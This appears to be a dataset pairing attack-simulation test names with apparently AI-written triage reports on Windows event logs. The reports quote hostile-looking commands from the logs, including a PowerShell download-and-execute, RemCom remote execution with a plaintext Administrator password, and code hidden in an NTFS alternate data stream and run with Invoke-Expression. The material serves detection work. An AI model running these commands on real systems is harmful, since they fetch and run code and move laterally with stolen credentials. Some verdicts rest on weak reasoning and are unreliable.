2. **Execution of Unusual Files**: There are event entries showing the execution of `namedpipes_executor.exe`, `namedpipes_server.exe`, and `namedpipes_client.exe` located in a temporary directory. These executables are not standard Windows files and could indicate a custom tool or malicious software, particularly given their presence in a temporary directory, which is uncharacteristic for system software.

3. **Windows Event Viewer Utilities (wevtutil.exe)**: The `wevtutil.exe` tool was executed multiple times by the same user account (`SERVER002\admin_test`). This tool is often used to manipulate or clear event logs, which may suggest an attempt to cover tracks.

4. **High Integrity Level Processes**: Several processes are running at high integrity levels, generally indicative of administrative privileges. This includes execution of scripts and the use of PowerShell, which could point to attempts at privilege escalation or post-exploitation activities.

5. **Process Chain and Parent Processes**: The parent-child relationship of processes such as `wsmprovhost.exe` to various executed processes (`namedpipes_executor`, `cmd.exe`, etc.) suggests the use of Windows Management Instrumentation (WMI), a common method for remote command execution.

6. **Security Log Events - Privilege Escalation**: The security logs show instances of privilege elevation (Event ID 4672) for the user `admin_test`, with various privileges assigned. While this may be legitimate for administrative users, it should be verified as part of standard procedures.

7. **Microsoft Edge Updates**: The logs include multiple entries related to Microsoft Edge Update processes, which are benign. However, the updates and installations need to be cross-verified with legitimate installation schedules to rule out any tampering or masquerading.

### Assessment and Resolution

**Resolution:** SUSPICIOUS

**Rationale:**
- The use of temporary directory executables and the execution of these non-standard files raise significant suspicion.
- The presence and execution patterns related to potentially administrative scripts and system tools (e.g., `PowerShell`, `wevtutil`) suggest abnormal activity that warrants further investigation.
- The behavior associated with these logs should be investigated further to confirm if these activities are part of legitimate administrative actions or indicative of a breach or misuse.

### Guidance for Further Investigation
- Review and validate the legitimacy of the `namedpipes_executor`, `namedpipes_server`, and `namedpipes_client` executables. Check for any approved use cases and verify their origins.
- Investigate the rationale behind the frequent use of `wevtutil.exe` by the `admin_test` account.
- Conduct a thorough review of the use of high-privilege accounts and verify against recent change requests or administrative tasks.
- Cross-reference the Microsoft Edge Update activity with installation logs to confirm legitimacy.

Taken together, while the logs provide certain indications, they do not conclusively confirm malicious activity without further context and investigation."

Use RemCom to execute a command on a remote host,"Upon analyzing the Sysmon logs provided, a few indicators suggest potential malicious activity:

1. **PowerShell Execution**: The first entry shows PowerShell being executed (EventRecordID: 18003). While PowerShell is a legitimate tool, its execution is often scrutinized due to its frequent abuse by attackers as a post-exploitation tool.

2. **Wevtutil Usage**: Multiple wevtutil.exe executions were logged shortly after (EventRecordIDs: 18007, 18011, 18015, 18019, 18023). The event utility (`wevtutil`) can be used to query, export, and clear event logs, which is suspicious because attackers might use it to cover their tracks.

3. **Remote Command Execution**: There is an execution of `cmd.exe` with a suspicious command line that attempts to run an external tool `remcom.exe` (EventRecordID: 18033). Remcom is a tool used for remote command execution, which can be leveraged in lateral movement or remote code execution.

4. **RemCom and ProcComs Execution**: Following the cmd.exe process, the `remcom.exe` and `ProcComs.bin` processes are executed (EventRecordID: 18035, 18036). These may indicate attempts to execute remote commands or scripts, potentially exploiting the environment.

5. **Potential Credential Compromise**: The RemCom command line includes credentials (`/user:Administrator /pwd:P@ssw0rd1`), suggesting that there might be attempts to use these credentials across the network, which is particularly worrying.

Considering these points, the activities observed in the logs exhibit characteristics of potential malicious behavior, particularly in terms of remote command execution, log manipulation, and the presence of known attack tools (e.g., RemCom). The inclusion of plaintext credentials in the command line is also an indicator of compromise.

Execute PowerShell script via Word DDE,"After analyzing the provided log entries from the application, Sysmon, security, and system logs, here is a detailed analysis of the events:

### Assessment of Log Events:

1. **Application Log:**
   - The logs indicate the repeated stopping of the `edgeupdate` service. There are no additional details or anomalies in these specific logs to suggest malicious activity through the application log.

2. **Sysmon Log:**
   - The execution of `wevtutil.exe` and `conhost.exe` under the user `SERVER002\admin_test` is notable. However, both `wevtutil.exe` (used for event log management) and `conhost.exe` (Command Prompt handler) are legitimate Windows utilities. The persistence and repeated launch could suggest automated tasks, but there are no immediate indicators of malicious command line arguments or typical exploitation behaviors.
   - The sequence involving `cmd.exe` to open a document (DDE_Document.docx) from a temporary directory is suspicious. DDE (Dynamic Data Exchange) can be used for legitimate automation purposes but is also known to be exploited, particularly through malicious documents, to initiate further actions without user consent.
   - `whoami.exe` and `hostname.exe` are utilized under a high integrity level, which is common during administrative tasks but can be suspicious in unintended contexts. Their execution here is not inherently malicious but should be accounted for based on context.
   - The activities regarding `Microsoft Edge Update` are consistent with standard update processes. The Edge Update processes involve installation and registration components, typical of update activities.

3. **Security Log:**
   - Event ID 5379 reflects an attempt to read credentials that returned a specific error code `3221226021`. This code generally indicates an unsuccessful attempt, possibly due to lack of permission or resource availability. While unsuccessful, repeated credential read operations without a valid context can be indicative of exploration or misconfigured services.
   - Time changes logged with Event ID 4616 are likely related to time synchronization tasks and show no direct malicious intent.

4. **System Log:**
   - Time-related events and system synchronization with `time.windows.com` suggest standard time correction operations occur, indicating legitimate system maintenance.

### Conclusion and Recommended Action:

- **Resolution: SUSPICIOUS**

The observation of `cmd.exe` with an unusual command line argument involving a temporary directory and potential document exploitation stands out as suspicious. Moreover, the attempts to access credentials in the security logs without successful results might imply either misconfigurations or exploratory behavior potentially due to malicious actions.

The combination of these behaviors warrants further investigation. The next steps should involve:
- **Interviewing relevant personnel** or checking associated automated workflows/scripts for legitimate purposes behind the interactions noted with `cmd.exe` and document operations.
- **Conduct deeper file and system integrity checks** within the user's context and the temporary directories mentioned, capturing any potentially dropped files or further breadcrumbs.
- **Strengthen monitoring of credential attempts** to capture more context should this event recur.

Additional scrutiny with relevant detail from these actions will help confirm or dispel the suspicion and guide corrective actions if necessary."
WMI Execute Local Process,"Based on the provided Windows event logs, let's analyze the entries and identify any suspicious or potentially malicious activity:

1. **PowerShell Log Analysis:**
   - The log is missing, which implies no new information from PowerShell executions.

2. **Application Log Analysis:**
   - The application logs show entries related to the ""Software Protection Platform Service,"" which are typical service entries and do not indicate suspicious activity.

3. **Sysmon Log Analysis:**
   - Several sysmon events capture common system utilities being executed (e.g., `whoami.exe`, `wevtutil.exe`, `conhost.exe`, `notepad.exe`, `cmd.exe`, etc.).
   - Execution of utilities like `whoami.exe` and `hostname.exe` could be used for reconnaissance-type activities, though they might also be routine administrative tasks.
   - The execution of `wmic` for process creation is notable. The command seen (`wmic process call create notepad.exe`) is used to execute Notepad but appears to have no immediate harmful payload. However, this type of pattern can indicate scripted behavior possibly used in attack scenarios.
   - The numerous `conhost.exe` and `wevtutil.exe` instances suggest script automation, potentially for log clearance or process obfuscation, which could be indicative of malicious intentions.
   - Many events are related to Microsoft Edge updates, which seem legitimate given the command lines and filenames. The process lineage shows expected parent-child relationships.

4. **Security Log Analysis:**
   - The security log is missing or not provided, hence no direct user logon/events are observed that might provide more contextual information.

5. **System Log Analysis:**
   - Also missing, providing no additional context on potential system behavior changes.

**Assessment:**
- The logs reveal several instances of system utilities being executed systematically. This could indicate:
  - Routine administrative or maintenance tasks.
  - An automated script running, possibly for software configuration or updates.
  - Potential abnormal activity given the usage of command-line tools like `wmic` to spawn processes.

**Conclusion:**
- **Resolution: SUSPICIOUS**

The activity does not clearly indicate a direct malicious action; however, the methods and frequency of the script-like behavior merit further investigation as it could be preliminary reconnaissance or preparation for more severe actions. Evaluating administrative scripts running at the time, reviewing any deviations from normal administrative patterns, and checking other network or security systems for correlated alerts are recommended to fully assess the intent and context of this behavior."
Potentially Unwanted Applications (PUA),"Upon reviewing the provided Windows event logs for the host ""Server002,"" I have identified several events that point to potentially suspicious activity.

### Detailed Analysis

1. **PowerShell Activity:**
   - There are multiple entries in the Windows PowerShell logs that involve the execution of a script with the command:
     ```
     Invoke-WebRequest http://amtso.eicar.org/PotentiallyUnwanted.exe -OutFile $env:TEMP/PotentiallyUnwanted.exe
     ```
     This command downloads a file named `PotentiallyUnwanted.exe` to a temporary directory and subsequently executes it. Such behavior is indicative of potentially unwanted software or malware delivery.
   - PowerShell is often used to execute scripts and commands that can download and execute files from the internet, which can be a vector for malware distribution.

2. **Sysmon Logs:**
   - The Sysmon logs corroborate the PowerShell activity, showing the process `""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\PotentiallyUnwanted.exe""` being executed.
   - The parent process of this executable is `powershell.exe`, which aligns with the PowerShell activity of downloading and executing the file.

3. **Windows Defender Update:**
   - The System log shows that Windows Defender received a Security Intelligence Update (KB2267602). This event alone is benign, but combined with the execution of the potentially unwanted executable, it suggests the system was recently updated and may be protected, albeit detection of such files is essential.

4. **Other System Activities:**
   - Regular system activities such as time synchronization with `time.windows.com`, Windows updates, and execution of Windows system utilities like `wevtutil.exe`, `conhost.exe`, and `whoami.exe` do not exhibit suspicious behavior by themselves but provide corroborative context.
   - These activities are expected parts of normal system operations; however, they occurred in close proximity to the PowerShell incident, suggesting an active session or administrative operation during which the suspicious activity was carried out.

### Assessment

Based on the above indicators, particularly the PowerShell script that involves downloading and executing an untrusted executable from a known security testing domain (amtso.org), this activity is suspicious. Although amtso.org is used for security testing, downloading and executing this file on a production server without explicit consent or testing purposes can indicate a security policy violation or potential compromise.

### Resolution

**SUSPICIOUS**

The identified behavior in the logs requires further investigation to determine the intent and impact. The following steps are recommended:

1. **Immediate Isolation:**
   - Isolate the machine from the network to prevent any further spread or unauthorized access.

2. **Investigation:**
   - Conduct a thorough investigation to determine the origin and intent behind the PowerShell script execution.
   - Check with IT staff or users to see if this was a sanctioned security test or an authorized action. If not authorized, it could indicate compromised credentials or unauthorized usage.

3. **Review Security Policies:**
   - Ensure that security policies regarding the use of PowerShell and internet downloads are enforced and educate users on safe practices.

4. **Scan and Remediation:**
   - Run comprehensive antivirus and anti-malware scans to ensure no additional threats are present.
   - Remove any unwanted or non-business related executables from the system.

5. **Evaluate Security Controls:**
   - Review and enhance security measures, such as PowerShell logging and network monitoring, to detect and prevent such activities in the future. 

Given the nature of the potential threat, take appropriate actions to ascertain that the system is secure and future occurrences are prevented."
ESXi - Install a custom VIB on an ESXi host,"After thoroughly analyzing the provided Windows event logs, here are the key observations:

1. **Sysmon Logs:**
   - Multiple processes like `powershell.exe`, `conhost.exe`, `wevtutil.exe`, `HOSTNAME.EXE`, `whoami.exe`, `pscp.exe`, and `plink.exe` were executed using the `SERVER002\admin_test` account within a short time frame. The combination of `pscp.exe` and `plink.exe` along with command-line arguments suggests potential file transfers and remote command execution.
   - The command-line argument for `pscp.exe` reveals a password (`-pw pass`) being used in plaintext, which is highly insecure and suggests potential malicious intent or misconfiguration.
   - The commands also involve connections to `file.local`, indicating potential data exfiltration or unauthorized remote access.
   
2. **Security Logs:**
   - Events with ID 4624 indicate successful logon attempts of the `SYSTEM` user. These use `LogonType=5`, which corresponds to a service logon. This can be normal behavior if the services are expected to run under the SYSTEM account.
   - Event ID 4672 logs show special privileges assigned to `SYSTEM`. While normal for certain legitimate services, in combination with other suspicious activities, this could indicate privilege abuse.
   
3. **Application Logs:**
   - Microsoft Edge update events generally appear benign and related to routine software updates. However, the `edgeupdate` service stops a couple of times, which might need further correlation with the timeline of suspicious activities.

4. **General Observations:**
   - The execution of administrative or system-level commands (e.g., `whoami.exe`, `cmd.exe`, `pscp.exe`, `plink.exe`) by the `admin_test` user raises concerns about potential misuse of credentials.
   - Use of tools such as PuTTY's `pscp.exe` and `plink.exe` for file transfer and remote connections, along with plaintext passwords, often indicates either a lack of security awareness or a malicious actor's attempt to maintain access and transfer data.

**Assessment:**
Based on the combination of command executions, the presence of potentially insecure practices (e.g., plaintext password use), and the usage pattern of specific applications, the activities documented in the logs are **SUSPICIOUS**. They warrant further investigation to confirm whether they are indeed benign misconfigurations or part of a malicious activity.

**Recommended Actions:**
- Immediately examine the user account `admin_test` for unauthorized access or activity.
- Change credentials and consider privilege reduction for this account until all suspicious activities have been cleared.
- Conduct network analysis and monitoring to check for unauthorized connections, particularly to `file.local` or other unexpected remote hosts.
- Review logging and configuration management to detect and mitigate insecure practices like plaintext passwords in scripts or commands.
- Perform a thorough security assessment to identify potential data loss and unauthorized access paths."
WMI Execute Remote Process,"Upon reviewing the provided Windows event logs, here is a detailed analysis of any suspicious or anomalous behavior and indicators of potential malicious activity:

1. **Time Manipulation (Event ID 4616)**:
   The logs indicate changes to the system time by the `svchost.exe` process under the `LOCAL SERVICE` account. This can sometimes be legitimate for system updates or time synchronization purposes but can also be exploited by attackers trying to manipulate timestamps for malicious activity. However, without additional context or an unauthorized source is observed, this appears benign.

2. **Privilege Escalation (Event ID 4672)**:
   The user `admin_test` is granted a series of special privileges, including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. While `admin_test` might be a legitimate administrative user, these privileges raise the risk of misuse for malicious actions like debugging sensitive processes or taking ownership of files.

3. **Failed Logon Attempts (Event ID 4625)**:
   Several failed logon attempts by `admin_test` targeting the `Administrator` account using the `wmic.exe` tool are recorded. These failed attempts (`Status: 0xC000006D, SubStatus: 0xC000006A`) indicate an incorrect username or password, suggesting possible brute force or otherwise unauthorized attempts to gain access to the `Administrator` account.

4. **Command Execution (Sysmon Event ID 1)**:
   The `cmd.exe` process is executing WMIC commands with explicit user and password credentials for `DOMAIN\Administrator`, attempting to create processes (`notepad.exe`) on the local machine. This is highly suspicious behavior as it involves using local credentials in a potentially insecure way, indicative of an attack trying to execute commands remotely or impersonate another user.

5. **Process Creation (Sysmon Event ID 1 & 5)**:
   Multiple processes such as `wevtutil.exe`, `conhost.exe`, and `whoami.exe` execute under the `admin_test` account. While these commands are common, their concurrent execution and occurrence after `cmd.exe` command executions indicate suspicious activity as it relates to gathering system information or altering event logs.

**Assessment and Recommendation**:
- **Resolution**: **MALICIOUS**
- Several indicators suggest malicious activity, including failed logon attempts, suspicious privilege escalations, and abuses of legitimate system tools like `wmic.exe` to execute potential attack techniques.
  
**Guidance on How to Proceed**:
1. Immediately investigate and verify the `admin_test` account's legitimacy and its recent activities.
2. Initiate a deeper investigation to determine if more systems were affected, considering the potential misuse of legitimate processes.
3. Change any credentials and privileges that were exposed or suspiciously escalated during these events.
4. Implement monitoring for similar activities across the network to identify and mitigate further attempts at compromise.
5. Review and implement additional security measures such as multi-factor authentication to prevent unauthorized access, along with a comprehensive audit of current user access and permissions."
NTFS Alternate Data Stream Access,"### Detailed Analysis

Upon examining the provided logs, the following points have been identified that could potentially indicate suspicious or malicious activities:

1. **Use of PowerShell with NTFS Alternate Data Streams (ADS):**
   - There are multiple Sysmon and PowerShell events indicating the use of PowerShell to manipulate files with NTFS alternate data streams as in the command:
     ```
     powershell.exe & {Add-Content -Path $env:TEMP\NTFS_ADS.txt -Value 'Write-Host \""Stream Data Executed\""' -Stream 'streamCommand', $streamcommand = Get-Content -Path $env:TEMP\NTFS_ADS.txt -Stream 'streamcommand', Invoke-Expression $streamcommand}
     ```
   - Using NTFS ADS for data storage and then executing it with `Invoke-Expression` could be a technique to hide malicious scripts from detection.

2. **Repeated Processes Execution by a High-Privilege User:**
   - Many processes such as `wevtutil.exe`, `conhost.exe`, and PowerShell instances are frequently executed by the user `SERVER002\admin_test` within a very short time frame. This could be indicative of automated script-based activity, and while `conhost.exe` is a legitimate process, frequent execution without clear reasons could suggest misuse.
   - The user `SERVER002\admin_test` has many elevated privileges as noted by events with `PrivilegeList`, indicating actions carried out potentially under an administrative context which could be under a misuse scenario.

3. **Login and Privilege Details:**
   - The security logs reveal logons using NTLM authentication, which is not unusual on its own, but the sequence of events, combined with subsequent actions, may suggest a compromised account being used for unauthorized actions.
   - There are instances where sensitive privileges such as `SeDebugPrivilege`, `SeSecurityPrivilege` etc., have been assigned to the `admin_test` user. Such privileges could potentially be used for system tampering or attacks on system integrity.

4. **Installation of Edge Update:**
   - While the installation of the Microsoft Edge update by a process running under `NT AUTHORITY\SYSTEM` could be a legitimate system update, it happens around the same time as other suspicious activities, which warrants closer inspection to ensure it wasn’t a disguised malicious action.
   
### Assessment and Resolution

Based on this comprehensive analysis:
- The activity of using NTFS ADS in conjunction with PowerShell scripting, especially with the `Invoke-Expression` cmdlet, points to potentially malicious intent.
- The advanced privileges held by the `admin_test` account could have been exploited.
- The frequency and nature of the PowerShell executions in a short burst suggest obfuscation attempts or execution of background tasks.

Taking into account all the details, especially the evidence of using PowerShell for potentially hidden script execution using ADS and invoking commands from it, this pattern is consistent with known malicious techniques.

**Resolution: MALICIOUS**

### Guidance

- **Immediate Actions:**
  - Temporarily disable the `admin_test` account to stop ongoing potential misuse.
  - Investigate the commands executed via PowerShell by potentially parsing the NTFS alternate data streams and verifying script contents.
  - Ensure the integrity of legitimate system updates like the Edge installation by checking cryptographic signatures and legitimate update channels.

- **Further Investigation:**
  - Conduct a full security audit focusing on PowerShell logs and additional associated script execution.
  - Review other system logs for any similar command or processes being invoked.
  - Use endpoint detection and response tools to identify any retrospective indicators of compromise on `SERVER002`.
  
- **Long-term Mitigation:**
  - Implement robust monitoring of PowerShell activities using constrained language mode and script block logging.
  - Apply the principle of least privilege, reducing privileged accounts and usage scenarios."
Suspicious Execution via Windows Command Shell,"### Analysis

Upon reviewing the provided Windows event logs from the Sysmon, Security, System, and Application logs associated with the machine ""Server002"", the following observations have been made:

#### Process Execution Patterns:
1. **Repetitive `wevtutil.exe` and `conhost.exe` Processes:**
   - There are numerous instances of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` being executed under the `SERVER002\\admin_test` account. The execution of `wevtutil.exe`, a utility used to interact with event logs, without context might raise suspicion, especially if not typically expected during the timeline.
   - These tools can be used for legitimate operations but can also be utilized by malicious actors for log tampering or concealment of traces.

2. **Command Prompt and Usage of Shell Commands:**
   - Instances of `cmd.exe` operations with complex command lines such as `\""cmd.exe\"" /c %%LOCALAPPDATA:~-3,1%%md /c echo Hello, from CMD! > hello.txt & type hello.txt`. These command lines seem obfuscated or include operations that might not be standard for regular administrative tasks.

3. **`whoami.exe` and `hostname.exe` Usage:**
   - These programs are legitimate Windows utilities, but their frequent and automated invocation, particularly by the `SERVER002\\admin_test` user, might suggest script or batch operations common in automation or potentially automated attacks.

#### Software Update Activity:
- **Microsoft Edge Update Operations:**
  - Multiple logs showing `MicrosoftEdgeUpdate.exe` activity, all running under `NT AUTHORITY\\SYSTEM`, indicating normal background software update operations for Microsoft Edge. While these are benign in isolation, unexpected behavior linking software updates to other suspicious patterns deserves further scrutiny to ensure no exploitation.

#### Time Synchronization Adjustments:
- **System Time Changes:**
  - The logs indicate several `svchost.exe` operations involved in time synchronization operations on the system. Time changes, especially if frequent, might attempt to mislead log analysis or align the local system with a remote attacker’s timeline.

### Conclusion
Based on the logs provided:

- **Suspicious Patterns**: The frequency and pattern of `wevtutil.exe` and `cmd.exe` commands warrant further investigation to rule out any misuse of these utilities for malicious purposes. Though most of these actions might be benign administrative tasks, automated, high-frequency operation patterns, especially with process duplication or potential obfuscation in command line usage, raise potential red flags.
  
- **Legitimate Software Update Activity**: Edge updates detected are consistent with benign, automated updates under the system account.

### Recommendation and Resolution
- **Resolution**: **SUSPICIOUS**
- **Guidance**: 
  1. Verify with system administrators whether the repetitive execution of utilities like `wevtutil.exe` and `cmd.exe` falls within normal operational patterns.
  2. Conduct a thorough review of scripts or configurations applied to `SERVER002` that might explain this behavior.
  3. Ensure system logging is active and evaluate logs across more systems to identify if other systems demonstrate similar behavior patterns.
  4. Cross-reference with any recent security alerts or incidents that could explain abnormal log operations.

Proceed with an in-depth investigation into the abnormal pattern of behavior noted within these logs to conclusively rule out or detect malicious activities."
SOAPHound - Build Cache,"### Analysis of Provided Logs:

Upon reviewing the various logs from the Windows machine, there are several points to consider in determining whether there is any suspicious or malicious activity.

#### System Logs:
- The log entries show typical system-related events, such as time change initiated by the `svchost.exe` process. These entries alone do not inherently appear suspicious, as these changes could be part of standard time synchronization activities.

#### Sysmon Logs:
- **Notable Entry:** There's a Sysmon EventID 1 log (Process Creation) for `powershell.exe` being used with the command line including `SOAPHound.exe`, which is located in a temporary directory with what appears to be an obfuscated command format and using clear text credentials.
- PowerShell executing with complex command lines that involve temporary directories or tools that are not typical administrative tools can potentially indicate lateral movement or reconnaissance activities.
- Repeated execution of `wevtutil.exe` and `conhost.exe` could be typical of script-based activities or logging utilities and are executed by the `admin_test` account, but without further context, it warrants more scrutiny as to why these actions are being repeated rapidly.

#### Application Logs:
- The application logs do not reveal any immediate threats or anomalies, primarily capturing service stop events related to Microsoft Edge Update. These appear standard after updates.

#### Security Logs:
- Time change-related entries are repeated here and do not display any signs of deliberate malicious intent.
  
#### Windows PowerShell Logs:
- The PowerShell logs corroborate the execution of a suspicious command that aligns with a possible malicious activity signature. Specifically, the use of a tool like `SOAPHound.exe` run through PowerShell using embedded credentials presents a red flag for potential credential harvesting or reconnaissance.

### Findings:
1. **Non-standard Use of PowerShell:** The execution of a potentially unknown or non-standard tool (`SOAPHound.exe`) through PowerShell, coupled with clear text passwords via command line, is a significant indicator of potential malicious activity.
2. **Activity Correlation:** While Microsoft Edge-related activities seem benign, they occur alongside other activities that could mask malicious operations.
3. **Script-like Operations:** The rapid execution of utility tools and processes (such as `wevtutil`), especially with repetition and administrative intervention (`admin_test`), suggests either an automated script or potential exploitation attempts.

### Threat Assessment:

Given the observed PowerShell activity with specific command execution involving obfuscated and suspicious command-line arguments, the behavior aligns with known indicators of compromise (IoCs), suggesting possible malicious intent.

### Resolution:

- **Resolution:** **MALICIOUS** - The combination of PowerShell executing suspicious scripts with embedded credentials, the obscurely named executable in a temporary directory, and the manner of execution strongly indicate malicious activity.
  
### Guidance:

1. **Immediate Action:**
   - Conduct a thorough endpoint investigation focusing on the source and integrity of the `SOAPHound.exe` file.
   - Investigate the `admin_test` account for any unauthorized access or activities.

2. **Remediation:**
   - Disable/detach any network access of the affected host to prevent further potential outbound communication that might come from this compromise.
   - Reset access credentials and assess all systems the credentials might influence.

3. **Further Investigation:**
   - Correlate these logs with network traffic for any suspicious data exfiltration or abnormal connections.
   - Review any other available logs or endpoint detection and response (EDR) tools for additional signs of compromise.

Following these steps, ensure your security infrastructure can detect and prevent similar activities in the future by enabling network segmentation, enhancing user access controls, and implementing stricter application whitelisting protocols."
JScript execution to gather local computer information via wscript,"After analyzing the provided Windows event logs, here is a comprehensive breakdown:

### Analysis:

1. **Security Logs:**
   - **Event ID 4672 & 4624:** Repeated logon events with high privilege tokens (SeDebugPrivilege, SeImpersonatePrivilege), which are expected for normal system operations done by SYSTEM or built-in services.
   - **Event ID 4798:** Enumeration of user accounts, which occurred frequently. This could indicate a legitimate system process or task querying user accounts but can also be potentially indicative of reconnaissance activity by a malicious actor.
   - **Event ID 5379:** Repeated errors in accessing a MicrosoftAccount, which could imply a legitimate misconfiguration or an anomaly worth further investigation but does not directly indicate a known attack vector or compromise.

2. **System and Application Logs:**
   - **Windows Update and System Processes:** Regular updates occurring seem to indicate normal Windows operations, without any direct signs of compromise.
   - **Edge Update Activities:** Processes related to Microsoft Edge updates are present, indicating that Edge browser updates are happening regularly.

3. **Sysmon Logs:**
   - **PowerShell Activity:** There is PowerShell activity performed by a user ""admin_test"" and by SYSTEM accounts. They seem to be executing simple commands and checks, which may indicate legitimate administrative tasks.
   - **Wevtutil and Conhost Processes:** Frequent invocations of `wevtutil` by the ""admin_test"" user. While `wevtutil` can be used in routine log management activities, the frequency and context could be worth verifying to ensure it's benign.

4. **Windows PowerShell Logs:**
   - Show PowerShell being utilized to execute minor commands as observed in sysmon logs. The use of ""Write-Host"", and simple commands often imply routine tasks rather than complex malicious scripts.

### Assessment:

- **Anomalous but Indeterminate**: Enumeration of accounts via TaskHostW and persistent PowerShell sessions are not necessarily malicious but provide entry points for attackers if exploited.
- **Misconfiguration/Errors**: Frequent security access errors on Microsoft services are more likely misconfiguration than direct evidence of malicious behavior.

### Conclusion and Resolution:

After thorough review, the logs do not conclusively provide evidence of ongoing malicious intent or confirmed compromise. Most logged activities like PowerShell commands and task enumerations can be associated with routine administrative tasks or system operations that may just need additional validation from a system or compliance standpoint to ensure configurations are correct.

**Resolution: SUSPICIOUS**

### Guidance:

1. **Validate User Activities**: Confirm with IT or SysAdmins regarding the frequent PowerShell and `wevtutil` usage to ensure these align with known administrative activities.
2. **Secure Audit Trails**: Ensure all system and security settings are audited and that permission settings are least privilege.
3. **Configuration Verification**: Address and verify why access errors for the Microsoft account are being logged and whether this corresponds to any operational or configuration issue.
4. **Continuous Monitoring**: Keep monitoring for similar patterns, as they might require further investigation if more context is provided or if new indicators emerge."
Create and Execute Batch Script,"Upon reviewing the provided log entries for the Windows machine labeled ""Server002,"" several aspects stand out that warrant detailed analysis.

1. **PowerShell Logging:**
   - Multiple logs indicate the execution of a PowerShell command with the following pattern: `powershell.exe & {Start-Process ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\data.003_script.bat""}`. 
   - This entry is notable for multiple reasons:
     - PowerShell's usage for executing scripts located in temporary directories can be a red flag, as this is a common tactic used in malicious activities to execute payloads.
     - Typically, benign scripts do not reside in temp folders or execute in such a manner.
     - The use of path traversal with `..\` in the command line indicates an attempt to access directories above the initial path, which is often used to obfuscate path access patterns.

2. **Security Log:**
   - Event ID 4624 indicates a successful logon by the SYSTEM account. The privileged account being used is expected, but should be correlated with legitimate tasks.
   - Event ID 4672 indicates privileged access being assigned to a process, including critical privileges like `SeDebugPrivilege` that could allow process memory manipulation. This is expected for services running as SYSTEM, but should be monitored under unusual contexts.

3. **Sysmon Logs:**
   - There are several process creation events involving typical system processes including `wevtutil.exe`, `hostname.exe`, `whoami.exe`, `powershell.exe`, `svchost.exe`, and `cmd.exe`. 
   - These executions, particularly `whoami.exe` and `cmd.exe` from PowerShell, can be indicative of a reconnaissance phase in an attack, attempting to gather information about the execution environment.
   - The execution of these processes under a high integrity level by the same user `SERVER002\admin_test` further suggests potential misuse or execution of commands with elevated privileges.

4. **Application and EdgeUpdate:**
   - There are many entries related to `MicrosoftEdgeUpdate.exe` performing multiple updates and registrations. While frequent updates and activities are common for update services, the presence of uploads and versions from temp directories like `C:\Program Files (x86)\Microsoft\Temp\` should be verified for legitimacy, as this could potentially be leveraged for other purposes beyond legitimate updates.

**Assessment:**
Given the context of the log entries, the combination of PowerShell execution from a temporary directory, path traversal, running scripts with potential elevated privileges, and process activities correlating with potential reconnaissance or payload execution indicates activity beyond what would be expected to be benign. 

**Resolution:**
- **SUSPICIOUS** - The activities present in the logs warrant further investigation to determine the legitimacy of the PowerShell script execution and the processes it initiated. This includes verifying if the script is authorized, its contents, and cross-checking against known malicious patterns or hashes. Additionally, reviewing user account activities and verifying the legitimacy of Microsoft Edge updates and their installation paths could reveal discrepancies.

**Guidance:**
- Conduct a forensic analysis on the contents of `data.003_script.bat` if accessible.
- Employ endpoint detection and response (EDR) tools to monitor further activities or anomalies for ""admin_test"".
- Validate Microsoft Edge updates and the environment from which they were executed.
- If unauthorized activities are confirmed, implement incident response protocols to contain and remediate any potential breach."
Execution through API - CreateProcess,"### Log Analysis and Findings:

Upon analyzing the provided Sysmon log events, here are the notable findings and their implications:

1. **PowerShell Execution**:
   - **Event Record ID 17961**: Execution of `powershell.exe` is noted. Although PowerShell is a legitimate tool, its usage often needs scrutiny due to its frequent usage in executing scripts and payloads by attackers. However, only the execution is logged without additional command-line parameters or scripts, which limits the ability to speculate further on potential malicious intent.

2. **Use of `wevtutil.exe`**:
   - **Event Record IDs 17965, 17969, 17973, 17977, 17981**: The repeated execution of `wevtutil.exe` suggests potential interactions with event logs. While this could be benign if part of legitimate system administration or monitoring activities, repeated and clustered instances of this tool warrant investigation to ensure event logs are not being tampered with (e.g., cleared or altered by an attacker).

3. **Suspicious Compilation Activity**:
   - **Event Record ID 17991**: `cmd.exe` executed a command string that invokes `csc.exe` (C# compiler) to compile a `.cs` file and subsequently run `data.exe`. The usage of a compiler to generate and execute an executable on-the-fly within a temporary directory is commonly associated with malicious activity, such as generating payloads for execution. This strongly indicates potential malicious behavior, especially given the lack of typical development activity markers.

4. **Execution of `calc.exe`**:
   - **Event Record ID 18003**: Execution of `calc.exe` from a command line could be a harmless test or indicative of payload execution succeeding (as `calc.exe` is often used in proof-of-concept code to demonstrate arbitrary code execution). The link between the compiled `data.exe` and the command line suggests a successful trigger resulting in the launching of `calc.exe`.

### Assessment:

- **Suspicious Elements**:
  - The clustered use of `wevtutil.exe` is suspicious and paired with potential log tampering tools often seen in post-exploitation stages.
  - Compilation of source code via `csc.exe` in a temporary directory and direct execution of generated executables, along with arbitrary launching of standard Windows applications (`calc.exe`), indicates suspicious behavior that is highly reminiscent of exploitation frameworks or custom attackers' scripts.

### Resolution:

- **SUSPICIOUS**: Due to the observed use of legitimate tools in a manner that is consistent with known malicious activity patterns, further investigations are required. Specifically, the context around these executions needs clarification, and the presence of malicious scripts or processes stemming from this activity should be confirmed.

### Guidance on How to Proceed:

1. **Immediate Steps**:
   - Lockdown the affected system by isolating it from the network to prevent further potential harm.
   - Examine the contents of any scripts or files created or modified around the event times, especially within the temporary directories.

2. **System Review**:
   - Audit all PowerShell command history and logs to determine if any scripts were executed that could provide more insights.
   - Review recent administrative activities with `wevtutil.exe` for authorized versus unauthorized users.

3. **Communicate and Collect Evidence**:
   - Notify the incident response team to start a comprehensive investigation.
   - Preserve all relevant logs and data for potential forensic analysis.

4. **Long-Term Actions**:
   - Review the security posture of the server, focusing on least privilege practices.
   - Consider implementing additional monitoring and configuring alerts for unusual usage patterns of critical system tools like PowerShell, `csc.exe`, and `wevtutil.exe`.

The conclusion of this investigation highlights the necessity to investigate further with adequate resources to substantiate or refute the suspicion of malicious intent."
Run Shellcode via Syscall in Go,"After reviewing the Windows event logs, here are my findings and analysis:

1. **Suspicious Process Execution in Sysmon Logs:**
    - Multiple instances of `wevtutil.exe` and `conhost.exe` are executed by the user account `SERVER002\admin_test`. These processes are not inherently malicious but could be used for legitimate or malicious purposes, depending on the context.
    - An execution of `hostname.exe` and `whoami.exe` is observed under the same user context. These actions can indicate an attempt to gather system and user information, which by themselves are benign but could support later malicious activities.
